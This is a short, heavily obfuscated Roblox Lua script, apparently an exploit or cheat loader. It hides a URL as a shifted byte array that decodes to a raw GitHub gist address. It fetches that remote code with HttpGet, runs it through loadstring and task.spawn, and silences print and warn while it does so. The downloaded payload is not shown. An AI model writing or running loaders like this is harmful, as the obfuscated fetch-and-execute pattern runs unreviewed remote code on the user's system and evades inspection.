local _0xL1 = string; local _0xL2 = table; local _0xL3 = game;
local _0xD = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}

local _0xT = {
    ["\103\101\116"] = function(o, u) return o:HttpGet(u, true) end,
    ["\108\100\115"] = loadstring,
    ["\100\101\102"] = function(d)
        local r = ""
        local k = 12
        for i = 1, #d do
            
            local v = d[i]
            r = r .. _0xL1.char(v - k)
        end
        return r
    end
}

local function _0xMAIN()
    local _0xS = 1
    local _0xF = nil
    
    while _0xS ~= 0 do
        if _0xS == 1 then
            
            local _0xG = #_0xL3.Name + _0xL3.PlaceId
            if _0xG == 0 then _0xS = 0 else _0xS = 2 end
        elseif _0xS == 2 then
           
            local _h = tostring(_0xL3.HttpGet)
            if not _h:find("HttpGet") then _0xS = 0 break end
            
            local _u = _0xT["\100\101\102"](_0xD)
            local _ok, _res = pcall(_0xT["\103\101\116"], _0xL3, _u .. "?v=" .. math.random(1, 999))
            
            if _ok and _res and #_res > 0 then
                _0xF = _0xT["\108\100\115"](_res)
                _0xS = 3
            else
                _0xS = 0
            end
        elseif _0xS == 3 then
            if _0xF then task.spawn(_0xF) end
            _0xS = 0
        end
    end
end


local _p, _w = print, warn
print, warn = function() end, function() end
_0xMAIN()
print, warn = _p, _w
